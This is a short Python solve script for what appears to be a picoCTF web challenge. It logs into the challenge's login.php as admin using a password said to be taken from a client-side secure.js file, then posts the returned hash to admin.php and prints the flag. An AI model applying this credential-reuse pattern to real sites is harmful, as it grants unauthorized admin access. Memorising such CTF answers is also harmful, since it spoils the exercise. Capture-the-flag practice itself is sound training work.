#!/usr/bin/env python3

import requests
import re

site1 = "http://saturn.picoctf.net:49699/login.php" # To login once login successful it sends post request to /admin.php with the hash after login
site2 = "http://saturn.picoctf.net:49699/admin.php"

data1 = { 'username': 'admin', 'password' : 'strongPassword098765', 'login': ""}    # Got username/password from secure.js file

web1 = requests.get(site1, data=data1).text

hashing = re.findall("value = (.*);",web1)
hash = "".join(hashing).replace('"', '')    # We are getting this hash after login

data2 = { 'hash': hash}

web2 = requests.post(site2, data=data2).text    # Sends the hash to /admin.php as a post request to get flag
f = re.findall("(.*)</body>", web2)
f1 = "".join(f)
flag = f1.replace(" ", "")
print("Your flag for this challenge is " + flag)
